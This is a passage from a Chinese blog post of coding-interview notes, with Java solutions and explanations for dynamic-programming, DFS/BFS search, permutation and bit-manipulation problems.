class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = <span class="hljs-number">1</span>; k &lt;= <span class="hljs-number">6</span> &amp;&amp; k &lt;= j; k++)&#123;<br>                dp[i][j] += dp[i-<span class="hljs-number">1</span>][j - k];<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">double</span>[] ans = <span class="hljs-keyword">new</span> <span class="hljs-keyword">double</span>[<span class="hljs-number">6</span> * n - n + <span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = n; i &lt;= <span class="hljs-number">6</span> * n;i++)&#123;<br>        ans[i - n] = ((<span class="hljs-keyword">double</span>)dp[n][i]) / (Math.pow(<span class="hljs-number">6</span>,n));<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-10-股票的最大利润"><a href="#6-10-股票的最大利润" class="headerlink" title="6.10 股票的最大利润"></a>6.10 股票的最大利润</h2><p>​    题目：假设把某股票的价格按照时间先后顺序存储在数组中，请问买卖该股票一次可能获得的最大利润是多少？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">maxProfit</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] prices)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> cost = Integer.MAX_VALUE, profit = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> price : prices) &#123;<br>        cost = Math.min(cost,price);<br>        profit = Math.max(profit,price-cost);<br>    &#125;<br>    <span class="hljs-keyword">return</span> profit;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-11-把数字翻译成字符串"><a href="#6-11-把数字翻译成字符串" class="headerlink" title="6.11 把数字翻译成字符串"></a>6.11 把数字翻译成字符串</h2><p>​    题目：给定一个数字，我们按照如下规则把它翻译为字符串：0 翻译成 “a” ，1 翻译成 “b”，……，11 翻译成 “l”，……，25 翻译成 “z”。一个数字可能有多个翻译。请编程实现一个函数，用来计算一个数字有多少种不同的翻译方法。</p><p>​    当 $num$ 第 1, 2 位的组成的数字 $\in [10,25]$ 时，显然应有 2 种翻译方法，即 $dp[2] = dp[1] + dp[0] = 2$ ，而显然 $dp[1] = 1$ ，因此推出 $dp[0] = 1$ 。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">translateNum</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num)</span> </span>&#123;<br>    String s = String.valueOf(num);<br>    <span class="hljs-comment">// dp[0]=dp[1]=1 ，即 “无数字” 和 “第 1 位数字” 的翻译方法数量均为 1 ；</span><br>    <span class="hljs-keyword">int</span> a = <span class="hljs-number">1</span>,b = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>;i &lt;= s.length(); i++)&#123;<br>        String tmp = s.substring(i-<span class="hljs-number">2</span>,i);<br>        <span class="hljs-keyword">int</span> c = tmp.compareTo(<span class="hljs-string">&quot;10&quot;</span>) &gt;= <span class="hljs-number">0</span> &amp;&amp; tmp.compareTo(<span class="hljs-string">&quot;25&quot;</span>) &lt;= <span class="hljs-number">0</span> ? a+b : a;<br>        b = a;<br>        a = c;<br>    &#125;<br>    <span class="hljs-keyword">return</span> a;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="7-DFS-amp-BFS"><a href="#7-DFS-amp-BFS" class="headerlink" title="7. DFS&amp;BFS"></a>7. DFS&amp;BFS</h1><h2 id="7-1-机器人的运动范围"><a href="#7-1-机器人的运动范围" class="headerlink" title="7.1 机器人的运动范围"></a>7.1 机器人的运动范围</h2><p>​    题目：地上有一个m行n列的方格，从坐标 [0,0] 到坐标 [m-1,n-1] 。一个机器人从坐标 [0, 0] 的格子开始移动，它每次可以向左、右、上、下移动一格（不能移动到方格外），也不能进入行坐标和列坐标的数位之和大于k的格子。例如，当k为18时，机器人能够进入方格 [35, 37] ，因为3+5+3+7=18。但它不能进入方格 [35, 38]，因为3+5+3+8=19。请问该机器人能够到达多少个格子？</p><p>​    矩阵搜索问题，通常可使用 深度优先搜索（DFS） 或 广度优先搜索（BFS） 解决。在进行具体算法之前先要进行的工作是数位之和的计算和搜索方向的简化。</p><p>数位之和的计算：逢10突变</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">(x + <span class="hljs-number">1</span>) % <span class="hljs-number">10</span> != <span class="hljs-number">0</span> ? s_x + <span class="hljs-number">1</span> : s_x - <span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>搜索方向简化：</p><ul><li>解的三角形结构：<ul><li>根据数位和特点，矩阵中满足数位和的解 构成的几何形状形如多个 等腰直角三角形 ，每个三角形的直角顶点位于 0, 10, 20, …0,10,20,… 等数位和突变的矩阵索引处 。</li><li>三角形内的解虽然都满足数位和要求，但由于机器人每步只能走一个单元格，而三角形间不一定是连通的，因此机器人不一定能到达，称之为 不可达解 ；同理，可到达的解称为 可达解 （本题求此解） 。</li></ul></li><li>结论： 根据可达解的结构，易推出机器人可 仅通过向右和向下移动，访问所有可达解 。<ul><li>三角形内部： 全部连通，易证；</li><li>两三角形连通处： 若某三角形内的解为可达解，则必与其左边或上边的三角形连通（即相交），即机器人必可从左边或上边走进此三角形。</li></ul></li></ul><p>深度优先（DFS）:</p><ul><li><p>深度优先搜索： 可以理解为暴力法模拟机器人在矩阵中的所有路径。DFS 通过递归，先朝一个方向搜到底，再回溯至上个节点，沿另一个方向搜索，以此类推。</p></li><li><p>剪枝： 在搜索中，遇到数位和超出目标值、此元素已访问，则应立即返回，称之为 可行性剪枝 。</p><p>算法解析：</p><ul><li>递归参数： 当前元素在矩阵中的行列索引 i 和 j ，两者的数位和 si, sj 。</li><li>终止条件： 当 ① 行列索引越界 或 ② 数位和超出目标值 k 或 ③ 当前元素已访问过 时，返回 00 ，代表不计入可达解。</li><li>递推工作：<ul><li>标记当前单元格 ：将索引 (i, j) 存入 Set visited 中，代表此单元格已被访问过。</li><li>搜索下一单元格： 计算当前元素的 下、右 两个方向元素的数位和，并开启下层递归 。</li></ul></li><li>回溯返回值： 返回 1 + 右方搜索的可达解总数 + 下方搜索的可达解总数，代表从本单元格递归搜索的可达解总数。</li></ul></li></ul><p>复杂度分析：</p><blockquote><p>M,N 分别为矩阵行列大小。</p></blockquote><ul><li>时间复杂度 O(MN) ： 最差情况下，机器人遍历矩阵所有单元格，此时时间复杂度为 O(MN) </li><li>空间复杂度 O(MN) ： 最差情况下，Set visited 内存储矩阵所有单元格的索引，使用 O(MN) 的额外空间。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span> m,n,k;<br><span class="hljs-keyword">boolean</span>[][] visited;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">movingCount1</span><span class="hljs-params">(<span class="hljs-keyword">int</span> m, <span class="hljs-keyword">int</span> n, <span class="hljs-keyword">int</span> k)</span> </span>&#123;<br>    <span class="hljs-comment">//DFS解法</span><br>    <span class="hljs-keyword">this</span>.m = m;<br>    <span class="hljs-keyword">this</span>.n = n;<br>    <span class="hljs-keyword">this</span>.k = k;<br>    <span class="hljs-keyword">this</span>.visited = <span class="hljs-keyword">new</span> <span class="hljs-keyword">boolean</span>[m][n];<br><br>    <span class="hljs-keyword">return</span> dfs(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> j, <span class="hljs-keyword">int</span> si, <span class="hljs-keyword">int</span> sj)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (i &gt;= m || j &gt;= n || si + sj &gt; k || visited[i][j] )&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    visited[i][j] = <span class="hljs-keyword">true</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> + dfs(i+<span class="hljs-number">1</span>,j,(i+<span class="hljs-number">1</span>) % <span class="hljs-number">10</span> != <span class="hljs-number">0</span> ? si+<span class="hljs-number">1</span> : si - <span class="hljs-number">8</span>,sj) + dfs(i,j+<span class="hljs-number">1</span>,si,(j+<span class="hljs-number">1</span>) % <span class="hljs-number">10</span> != <span class="hljs-number">0</span> ? sj+<span class="hljs-number">1</span> : sj-<span class="hljs-number">8</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>广度优先（BFS）:</p><p>通常使用队列完成广度优先。</p><p>算法解析：</p><ul><li>初始化： 将机器人初始点 (0, 0)(0,0) 加入队列 queue ；</li><li>迭代终止条件： queue 为空。代表已遍历完所有可达解。</li><li>迭代工作：<ul><li>单元格出队： 将队首单元格的 索引、数位和 弹出，作为当前搜索单元格。</li><li>判断是否跳过： 若 ① 行列索引越界 或 ② 数位和超出目标值 k 或 ③ 当前元素已访问过 时，执行 continue 。</li><li>标记当前单元格 ：将单元格索引 (i, j) 存入 Set visited 中，代表此单元格 已被访问过 。</li><li>单元格入队： 将当前元素的 下方、右方 单元格的 索引、数位和 加入 queue 。</li></ul></li><li>返回值： Set visited 的长度 len(visited) ，即可达解的数量。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">movingCount2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> m, <span class="hljs-keyword">int</span> n, <span class="hljs-keyword">int</span> k)</span> </span>&#123;<br>    <span class="hljs-comment">//BFS解法</span><br>    <span class="hljs-keyword">boolean</span>[][] visited = <span class="hljs-keyword">new</span> <span class="hljs-keyword">boolean</span>[m][n];<br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>;<br>    Queue&lt;<span class="hljs-keyword">int</span>[]&gt; queue= <span class="hljs-keyword">new</span> LinkedList&lt;<span class="hljs-keyword">int</span>[]&gt;();<br>    queue.add(<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[] &#123; <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span> &#125;);<br>    <span class="hljs-keyword">while</span>(queue.size() &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">int</span>[] x = queue.poll();<br>        <span class="hljs-keyword">int</span> i = x[<span class="hljs-number">0</span>], j = x[<span class="hljs-number">1</span>], si = x[<span class="hljs-number">2</span>], sj = x[<span class="hljs-number">3</span>];<br>        <span class="hljs-keyword">if</span>(i &gt;= m || j &gt;= n || k &lt; si + sj || visited[i][j])&#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        visited[i][j] = <span class="hljs-keyword">true</span>;<br>        res ++;<br>        queue.add(<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[] &#123; i + <span class="hljs-number">1</span>, j, (i + <span class="hljs-number">1</span>) % <span class="hljs-number">10</span> != <span class="hljs-number">0</span> ? si + <span class="hljs-number">1</span> : si - <span class="hljs-number">8</span>, sj &#125;);<br>        queue.add(<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[] &#123; i, j + <span class="hljs-number">1</span>, si, (j + <span class="hljs-number">1</span>) % <span class="hljs-number">10</span> != <span class="hljs-number">0</span> ? sj + <span class="hljs-number">1</span> : sj - <span class="hljs-number">8</span> &#125;);<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="7-2-字符串的排列"><a href="#7-2-字符串的排列" class="headerlink" title="7.2 字符串的排列"></a>7.2 字符串的排列</h2><p>​    题目：输入一个字符串，打印出该字符串中字符的所有排列。你可以以任意顺序返回这个字符串数组，但里面不能有重复元素。</p><p>全排序问题，DFS回溯</p><p>示例：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nix">输入：<span class="hljs-attr">s</span> = <span class="hljs-string">&quot;abc&quot;</span><br>输出：[<span class="hljs-string">&quot;abc&quot;</span>,<span class="hljs-string">&quot;acb&quot;</span>,<span class="hljs-string">&quot;bac&quot;</span>,<span class="hljs-string">&quot;bca&quot;</span>,<span class="hljs-string">&quot;cab&quot;</span>,<span class="hljs-string">&quot;cba&quot;</span>]<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">  List&lt;String&gt; res = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br>  <span class="hljs-keyword">char</span>[] c;<br><br><br><span class="hljs-comment">/**  输入一个字符串，打印出该字符串中字符的所有排列。</span><br><span class="hljs-comment">  你可以以任意顺序返回这个字符串数组，但里面不能有重复元素。*/</span><br>  <span class="hljs-keyword">public</span> String[] permutation(String s) &#123;<br>      c = s.toCharArray();<br>      dfs(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">return</span> res.toArray(<span class="hljs-keyword">new</span> String[res.size()]);<br>  &#125;<br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span>&#123;<br>      <span class="hljs-comment">//结束条件</span><br>    <span class="hljs-keyword">if</span> (x == c.length-<span class="hljs-number">1</span>)&#123;<br>      res.add(String.valueOf(c));<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    HashSet&lt;Character&gt; set = <span class="hljs-keyword">new</span> HashSet&lt;&gt;();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = x; i &lt; c.length; i++)&#123;<br>        <span class="hljs-comment">//剪枝</span><br>      <span class="hljs-keyword">if</span> (set.contains(c[i]))&#123;<span class="hljs-keyword">continue</span>;&#125;<br>        <span class="hljs-comment">//做选择</span><br>      set.add(c[i]);<br>      swap(x,i);<br>      dfs(x+<span class="hljs-number">1</span>);<br>        <span class="hljs-comment">//撤销选择</span><br>      swap(x,i);<br>    &#125;<br>  &#125;<br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-keyword">char</span> tmp = c[a];<br>    c[a] = c[b];<br>    c[b] = tmp;<br>  &#125;<br></code></pre></td></tr></table></figure><h1 id="8-位运算"><a href="#8-位运算" class="headerlink" title="8. 位运算"></a>8. 位运算</h1><h2 id="8-1-二进制中1的个数"><a href="#8-1-二进制中1的个数" class="headerlink" title="8.1 二进制中1的个数"></a>8.1 二进制中1的个数</h2><p>​    题目：输入一个整数，输出该数32位二进制表示中1的个数。其中负数用补码表示。</p><p>​    简单的方法是直接遍历二进制每一位进行统计得出结果，但是还要考虑负数补码的问题。但涉及到位运算还有更巧妙的算法：    </p><p>两种方法：</p><p>逐位判断：</p><p>利用无符号右移和与运算</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hammingWeight</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> count = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (n != <span class="hljs-number">0</span>) &#123;<br>            count += n &amp; <span class="hljs-number">1</span>;<br>            n &gt;&gt;&gt;= <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> count;<br>    &#125;<br></code></pre></td></tr></table></figure><p>巧用 n \&amp; (n - 1)：</p><p>​    看到二进制，补码等关键字，首先想到位运算。把一个整数减去1，再和原整数做与运算，会把该整数最右边一个1变成0。那么一个整数的二进制表示中有多少个1，就可以进行多少次这样的操作。负数在Java内存中默认使用补码存储。基于这种思路，我们可以写出新的代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">NumberOf1</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> count = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(n!=<span class="hljs-number">0</span>)&#123;<br>        n = n &amp; (n-<span class="hljs-number">1</span>);<br>        count++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> count;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="8-2-数组中数字出现的次数Ⅰ"><a href="#8-2-数组中数字出现的次数Ⅰ" class="headerlink" title="8.2 数组中数字出现的次数Ⅰ"></a>8.2 数组中数字出现的次数Ⅰ</h2><p>​    题目：一个整型数组 <code>nums</code> 里除两个数字之外，其他数字都出现了两次。请写程序找出这两个只出现一次的数字。要求时间复杂度是O(n)，空间复杂度是O(1)。</p><font color='red'>位运算</font><p>​    O(n)未必是一次遍历，只要不嵌套循环即可。</p><blockquote><p>如果除了<strong>一个</strong>数字以外，其他数字都出现了两次，那么如何找到出现一次的数字</p></blockquote><p>​        全员进行异或操作即可。考虑异或操作的性质：对于两个操作数的每一位，相同结果为 0，不同结果为 1。那么在计算过程中，成对出现的数字的所有位会两两抵消为 0，最终得到的结果就是那个出现了一次的数字。</p><p>那么这一方法如何扩展到找出两个出现一次的数字呢？</p><p>如果我们可以把所有数字分成两组，使得：</p><ol><li>两个只出现一次的数字在不同的组中；</li><li>相同的数字会被分到相同的组中。</li></ol><p>那么对两个组分别进行异或操作，即可得到答案的两个数字。这是解决这个问题的关键。</p><p>那么如何实现这样的分组呢？</p><p>​    记这两个只出现了一次的数字为 a 和 b，那么所有数字异或的结果就等于 a 和 b 异或的结果，我们记为 x。如果我们把 x 写成二进制的形式$ x<em>k x</em>{k - 1} \cdots x_2 x_1 x_0$，其中$ x_i \in { 0, 1 }$,我们考虑一下 $x_i = 0$和 $x_i = 1$ 的含义是什么？它意味着如果我们把 a 和 b 写成二进制的形式，$a_i$和 $b_i的$关系——$x_i = 1$ 表示 $a_i$ 和 $b_i$  不等，$x_i = 0$ 表示 $a_i$  和 $b_i$相等。假如我们任选一个不为 0 的$ x_i $，按照第 i位给原来的序列分组，如果该位为 0 就分到第一组，否则就分到第二组，这样就能满足以上两个条件，为什么呢？</p><ul><li><p>首先，两个相同的数字的对应位都是相同的，所以一个被分到了某一组，另一个必然被分到这一组，所以满足了条件 2。</p></li><li><p>这个方法在$ x_i = 1$的时候 a和 b不被分在同一组，因为 $x_i = 1$表示 $a_i$和$ b_i$不等，根据这个方法的定义「如果该位为 0就分到第一组，否则就分到第二组」可以知道它们被分进了两组，所以满足了条件 1。</p><p>在实际操作的过程中，我们拿到序列的异或和 x 之后，对于这个「位」是可以任取的，只要它满足$ x_i = 1$。但是为了方便，这里的代码选取的是「不为 0 的最低位」，当然你也可以选择其他不为 0 的位置。</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] singleNumbers(<span class="hljs-keyword">int</span>[] nums) &#123;<br>    <span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//1.ret是所有数异或结果</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> n : nums) &#123;<br>        ret ^= n;<br>    &#125;<br>    <span class="hljs-comment">//2.取ret中不为0的最低位div</span><br>    <span class="hljs-keyword">int</span> div = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span>((div &amp; ret) == <span class="hljs-number">0</span>)&#123;<br>        div &lt;&lt;= <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-comment">//3.分组</span><br>    <span class="hljs-keyword">int</span> a = <span class="hljs-number">0</span>, b = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> n : nums)&#123;<br>        <span class="hljs-keyword">if</span> ((div &amp; n) != <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-comment">//使用(div &amp; n) == 1不行</span><br>            a ^= n;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            b ^= n;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;a,b&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="8-3-数组中数字出现的次数Ⅱ"><a href="#8-3-数组中数字出现的次数Ⅱ" class="headerlink" title="8.3 数组中数字出现的次数Ⅱ"></a>8.3 数组中数字出现的次数Ⅱ</h2><p>​    题目：在一个数组 <code>nums</code> 中除一个数字只出现一次之外，其他数字都出现了三次。请找出那个只出现一次的数字。</p><font color='red'>位运算</font><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">singleNumber</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span>[] counts = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">32</span>];<br>    <span class="hljs-comment">//1.使用counts数组统计各位和</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> num : nums) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">32</span>; j++) &#123;<br>            <span class="hljs-comment">//更新第j位</span><br>            counts[j] += num &amp; <span class="hljs-number">1</span>;<br>            <span class="hljs-comment">//移位到j+1位</span><br>            num &gt;&gt;&gt;= <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//2.将counts各位对3求余</span><br>    <span class="hljs-comment">//3.将counts数组恢复到res上</span><br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>, m = <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; counts.length; i++) &#123;<br>        res &lt;&lt;= <span class="hljs-number">1</span>;<br>        <span class="hljs-comment">//count的0处索引是最高位</span><br>        res |= counts[<span class="hljs-number">31</span> - i] % m;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="8-4-求1-2-…-n"><a href="#8-4-求1-2-…-n" class="headerlink" title="8.4 求1+2+…+n"></a>8.4 求1+2+…+n</h2><p>​    题目：求 <code>1+2+...+n</code> ，要求不能使用乘除法、for、while、if、else、switch、case等关键字及条件判断语句（A?B:C）。</p><p>方法一：逻辑运算符短路</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">sumNums</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>        <br>        <span class="hljs-keyword">boolean</span> x = n &gt; <span class="hljs-number">1</span> &amp;&amp; (n += sumNums(n - <span class="hljs-number">1</span>)) &gt; <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> n;<br>    &#125;<br></code></pre></td></tr></table></figure><p>方法二：try-catch</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">sumNums</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span>[] test = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> test[n];<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        <span class="hljs-keyword">return</span> sumNums(n-<span class="hljs-number">1</span>)+n;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="8-5-不用加减乘除做加法"><a href="#8-5-不用加减乘除做加法" class="headerlink" title="8.5 不用加减乘除做加法"></a>8.5 不用加减乘除做加法</h2><p>​    题目：写一个函数，求两个整数之和，要求在函数体内不得使用 “+”、“-”、“*”、“/” 四则运算符号。</p><p>​    本题考察对位运算的灵活使用，即使用位运算实现加法。<br>​    设两数字的二进制形式 a,b ，其求和 s = a + b，a(i) 代表 a 的二进制第 i 位，则分为以下四种情况：</p><div class="table-container"><table><thead><tr><th>a(i)</th><th>b(i)</th><th>无进位和n(i)</th><th>进位c(i+1)</th></tr></thead><tbody><tr><td>0</td><td>0</td><td>0</td><td>0</td></tr><tr><td>0</td><td>1</td><td>1</td><td>0</td></tr><tr><td>1</td><td>0</td><td>1</td><td>0</td></tr><tr><td>1</td><td>1</td><td>0</td><td>1</td></tr></tbody></table></div><p>观察发现，无进位和 与 异或运算 规律相同，进位 和 与运算 规律相同（并需左移一位）。因此，无进位和 n 与进位 c 的计算公式如下；</p><script type="math/tex; mode=display">\begin{cases} n = a \oplus b & 非进位和：异或运算 \\ c = a \& b << 1 & 进位：与运算 + 左移一位 \end{cases}</script><p>（和 s ）=（非进位和 n ）+（进位 c ）。即可将 s = a + b转化为：</p><script type="math/tex; mode=display">s = a + b \Rightarrow s = n + c</script><p>由于n+c不能用加法，循环求 